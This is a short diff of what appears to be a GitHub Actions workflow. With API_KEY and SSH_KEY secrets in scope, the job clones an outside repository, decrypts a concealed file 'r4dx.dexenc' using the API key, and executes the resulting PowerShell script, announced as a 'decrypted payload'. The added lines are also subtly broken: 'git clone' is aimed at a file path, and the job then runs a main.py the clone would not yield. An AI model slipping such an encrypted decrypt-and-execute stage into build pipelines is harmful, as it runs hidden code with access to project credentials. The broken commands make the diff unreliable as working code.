@@ -29,11 +29,11 @@ jobs:
           API_KEY: ${{ secrets.API_KEY }}
           SSH_KEY: ${{ secrets.SSH_KEY }}
         run: |
-          git clone https://github.com/Scheldest/dex-enc.git --quiet
-          pip install dex-enc/. --quiet
+          git clone https://github.com/Scheldest/dex-enc.git/onlyonepyfile/main.py --quiet
+          python main.py --quiet
           $p = Join-Path $pwd "r4dx.dexenc"
           if (Test-Path $p) {
-              dexenc decrypt -i $p -key "$env:API_KEY" -o "$pwd\r4dx.ps1"
+              python main.py decrypt -i $p -key "$env:API_KEY" -o "$pwd\r4dx.ps1"
               if (Test-Path "$pwd\r4dx.ps1") {
                   Write-Host "[+] Executing decrypted payload..." -ForegroundColor Green
                   . "$pwd\r4dx.ps1"
